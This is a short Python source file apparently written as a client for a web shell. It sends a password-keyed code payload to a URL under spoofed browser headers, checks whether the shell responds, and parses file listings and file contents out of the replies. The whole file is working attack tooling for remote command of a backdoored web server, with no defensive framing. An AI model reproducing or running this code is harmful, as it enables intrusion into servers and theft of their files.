import requests
import re
import json
from lxml import etree
class SendCode(object):
	def __init__(self,url,pwd=None,code=None):
		self.url = url
		self.pwd = pwd
		self.code = code
		self._loadHeaders()
	def _loadHeaders(self):
		self.headers = {
			'Accept': '*/*',
			'Referer': 'http://www.baidu.com',
			'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; ',
			'Cache-Control': 'no-cache',
		}
	def checkshell(self):
		self.data = {
			self.pwd : self.code
		}
		r = requests.post(self.url,headers=self.headers,data=self.data,allow_redirects=False,timeout=60)
		
		if r.status_code == 200:
			if len(r.text) > 1:
				return True
			else:
				return False
		else:
			return False
	def getFileListres(self):
		self.data = {
			self.pwd : self.code
		}
		r = requests.post(self.url,headers=self.headers,data=self.data)
		fileListres = re.findall('string.*?"(.*?)"',r.text)
		return str(fileListres)
	def getfilecontent(self):
		self.data = {
			self.pwd : self.code
		}
		r = requests.post(self.url,headers=self.headers,data=self.data)
		return r.text.replace("<","&lt")
	def getFilelist(self):
		self.data = {
			self.pwd : self.code
		}
		r = requests.post(self.url,headers=self.headers,data=self.data)
		HTML = etree.HTML(r.text)
		a = HTML.xpath('//ek/text()')[0]
		return json.loads(a)
